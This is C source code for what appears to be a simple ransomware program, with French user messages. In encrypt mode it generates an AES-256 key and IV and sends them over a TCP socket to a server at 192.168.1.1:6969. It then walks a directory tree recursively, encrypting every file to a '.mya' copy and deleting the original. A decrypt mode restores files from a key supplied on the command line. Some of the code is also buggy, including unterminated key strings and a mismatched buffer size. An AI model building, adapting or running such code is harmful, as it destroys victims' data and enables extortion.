#include <stdio.h>
#include <string.h>
#include <dirent.h>
#include <malloc.h>
#include <stdlib.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <openssl/rand.h>

#define AES_256_KEY_SIZE 32
#define AES_BLOCK_SIZE 16
#define BUFFER_SIZE 1024

void handleErrors (void);
int encrypt (FILE * f_in, FILE * f_out, unsigned char * key, unsigned char * iv);
int decrypt (FILE * f_in, FILE * f_out, unsigned char * key, unsigned char * iv);

int soket (unsigned char * key)
{
    int sockid = socket(AF_INET,SOCK_STREAM,0);
    int server_port = 6969;
    char * server_ip = "192.168.1.1";

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(server_port);
    server_addr.sin_addr.s_addr = inet_addr(server_ip);

    connect(sockid, (struct sockaddr *) &server_addr, sizeof(server_addr));
    send(sockid, (unsigned char *) key, strlen(key), 0);
    close(sockid);
 }

void handleErrors(void)
{
    ERR_print_errors_fp(stderr);
    abort();
}

int encrypt (FILE * f_in , FILE * f_out , unsigned char *key , unsigned char * iv)
{
    EVP_CIPHER_CTX * ctx;
    int len = 0;
    int ciphertext_len = 0;
    char buffer_in [BUFFER_SIZE];
    char buffer_out [BUFFER_SIZE];
    int read_block;

    if (!(ctx = EVP_CIPHER_CTX_new()))
    {
        handleErrors();
    }

    if (1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
    {
        handleErrors();
    }

    while ((read_block = fread(buffer_in, sizeof(char), BUFFER_SIZE, f_in)) > 0)
    {
        if (1 != EVP_EncryptUpdate(ctx, buffer_out, &len, buffer_in, read_block))
        {
            handleErrors();
        }
        ciphertext_len = ciphertext_len + len;
        fwrite(buffer_out, sizeof(char), len, f_out);
    }

    if (1 != EVP_EncryptFinal_ex(ctx, buffer_out, &len))
    {
        handleErrors();
    }

    fwrite(buffer_out, sizeof(char), len, f_out);
    ciphertext_len = ciphertext_len + len;

    EVP_CIPHER_CTX_free(ctx);

    return ciphertext_len;
}

int decrypt (FILE * f_in , FILE * f_out , unsigned char * key , unsigned char * iv)
{
    EVP_CIPHER_CTX * ctx;

    int len = 0;
    int ciphertext_len = 0;
    char buffer_in [BUFFER_SIZE];
    char buffer_out [BUFFER_SIZE];
    int count;

    if (!(ctx = EVP_CIPHER_CTX_new ()))
    {
        handleErrors();
    }

    if (1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
    {
        handleErrors();
    }
    while ((count = fread(buffer_in, sizeof(char), BUFFER_SIZE, f_in )) > 0)
    {
        if (1 != EVP_DecryptUpdate(ctx, buffer_out, &len, buffer_in, count))
        {
            handleErrors();
        }
        ciphertext_len = ciphertext_len + len;
        fwrite(buffer_out, sizeof(char), len, f_out);
    }

    if (1 != EVP_DecryptFinal_ex(ctx, buffer_out, &len))
    {
        handleErrors();
    }
    fwrite(buffer_out, sizeof(char), len, f_out);
    ciphertext_len = ciphertext_len + len;

    EVP_CIPHER_CTX_free(ctx);

    return ciphertext_len ;
}

int readwrite(char * path, char * type, unsigned char * key, unsigned char * iv)
{    
    FILE * plaintext_file;
    FILE * encrypted_file;
    FILE *decrypted_file;

    if (strncmp(type, "e", 1) == 0)
    {
        char * workPath = (char *) malloc(sizeof(char) * (strlen(path) + 5));//+5 ".mya"
        strcpy(workPath, path);
        plaintext_file = fopen(path, "rb");
        encrypted_file = fopen(strcat(workPath, ".mya"), "wb");

        if (plaintext_file == NULL || encrypted_file == NULL)
        {
            fputs("Erreur d'ouverture du fichier \n",stdout);
            exit(0);
        }
        encrypt(plaintext_file, encrypted_file, key, iv);
        fclose(plaintext_file);
        fclose(encrypted_file);
        free(workPath);
    }

    else
    {
        if ( strncmp ( type , "d" ,1)==0)
        {
            char * workPath = (char *) malloc(sizeof(char) * (strlen(path))+1);
            strcpy(workPath, path);

            memset(workPath + strlen(workPath) - 4, '\0', 4);

            encrypted_file = fopen ( path , "rb" ) ;
            decrypted_file = fopen (workPath, "wb" ) ;
            if (decrypted_file == NULL || encrypted_file == NULL)
            {
                fputs("Erreur d'ouverture du fichier \n",stdout);
                exit(0);
            }
            decrypt(encrypted_file, decrypted_file, key, iv);
            fclose(encrypted_file);
            fclose(decrypted_file);
            free(workPath);
        }

        else
        {
            fputs("Option inconnue\n",stdout);
        }
    }    
return 0;
}

int recur(char * path, char * type, unsigned char * key, unsigned char * iv)
{
    int len = strlen(path);
    struct dirent * dir;
    DIR * d = opendir(path);
    while ((dir = readdir(d)) != NULL)
    {
        char * pathWithFile = (char *) malloc(sizeof(char) * (strlen(dir->d_name) + len + 2));
        strcpy(pathWithFile, path);
        strcat(pathWithFile, "/");
        strcat(pathWithFile, dir->d_name);

        if (dir->d_type == DT_DIR)
        {
            if (strcmp(dir->d_name, ".") != 0 && strcmp(dir->d_name, "..") != 0)
            {
                recur(pathWithFile,type,key,iv);
            }
        }
        else
        {
            if (strcmp(dir->d_name, "mya") != 0)
            {
                readwrite(pathWithFile, type, key, iv);
                
                if (remove(pathWithFile) == 1)
                {
                    perror("Erreur lors de la suppression du fichier");
                }
            }
            else
            {
                if(strncmp (type, "d", 1) == 0)
                {
                    if (remove(pathWithFile) != 0)
                    {
                        perror("Erreur lors de la suppression du fichier");
                    }
                }
            }
        }
        free(pathWithFile);
    }  
closedir(d);
}

int gen_key_iv(unsigned char * key, unsigned char * iv)
{
    if (!RAND_bytes(iv, AES_BLOCK_SIZE))
    {
        fprintf(stderr, "ERROR: RAND_bytes error: %s\n", strerror(errno));
        return errno;
    }

    if (!RAND_bytes(key, AES_256_KEY_SIZE))
    {
        fprintf(stderr, "ERROR: RAND_bytes error: %s\n", strerror(errno));
        return errno;
    }

    for (int i = 0; i < AES_256_KEY_SIZE; i++)
    {
        while (key[i] < 35 || key[i] > 126 || key[i] == 39|| key[i] == 92|| key[i] == 123|| key[i] == 125|| key[i] == 96|| key[i] == 36|| key[i] == 40|| key[i] == 41|| key[i] == 91|| key[i] == 93)
        {
            if (!RAND_bytes(&key[i], 1))
            {
                fprintf(stderr, "ERROR: RAND_bytes error: %s\n", strerror(errno));
                return errno;
            }
        }
    }

    for (int i = 0; i < AES_BLOCK_SIZE; i++)
    {
        while (iv[i] < 35 || iv[i] > 126 || iv[i] == 39|| iv[i] == 92|| iv[i] == 123|| iv[i] == 125|| iv[i] == 96|| iv[i] == 36|| iv[i] == 40|| iv[i] == 41|| iv[i] == 91|| iv[i] == 93)
        {//39=' 92="\" 123={ 125=} 96=´ 36=$ 40/41=() 91/93=[]
            if (!RAND_bytes(&iv[i], 1))
            {
                fprintf(stderr, "ERROR: RAND_bytes error: %s\n", strerror(errno));
                return errno;
            }
        }
    }
    return 0;
}

void concat_key_iv(unsigned char *key, unsigned char *iv, char *output)
{
  snprintf(output, BUFFER_SIZE, "Cle : %s\nIv : %s", key, iv);
}

int main(int argc, char * argv[])
{
    struct timeval start;//clock
    gettimeofday(&start, NULL);

    if ( argc <2)
    {
        fputs("S'il vous plait entrez le mode de chiffrement (e|d)\n",stdout);
        exit(0);
    }

    if (strncmp(argv[1], "e", 1) == 0)
    {
        if ( argc !=3)
        {
            fputs("S'il vous plait entrez le mode de chiffrement (e|d)\n et le chemin d'acces\"\" et sans cle et iv\n",stdout);      
            exit(0);
        }
        unsigned char key[AES_256_KEY_SIZE];
        unsigned char iv[AES_BLOCK_SIZE];
        gen_key_iv(key,iv);

        unsigned char key_iv[64];
        concat_key_iv(key,iv,key_iv);
        soket(key_iv);
        recur(argv[2],argv[1],key,iv);
    }

    if (strncmp(argv[1], "d", 1) == 0)
    {
        if (argc != 5)
        {
            fputs("S'il vous plait entrez le mode de chiffrement (e|d)\n et le chemin d'acces entre \"\" et cle et iv  entre \"\"\n",stdout);
            exit(0) ;
        }
        unsigned char key[AES_256_KEY_SIZE];
        unsigned char iv[AES_BLOCK_SIZE];
        strcpy(key,argv[3]);
        strcpy(iv,argv[4]);
        recur(argv[2],argv[1],key,iv);
    }

    struct timeval end;//clock
    gettimeofday(&end, NULL);
    double elapsed_time = (end.tv_sec - start.tv_sec) + (end.tv_usec - start.tv_usec) / 1000000.0;
    char * time = malloc(sizeof(char) * (strlen("Temps depuis le debut du chiffrement :  secondes\n")+sizeof(elapsed_time)));
    sprintf(time,"Temps depuis le debut du chiffrement : %f secondes\n", elapsed_time);
    fputs(time,stdout);
    free(time);
    return 0;
}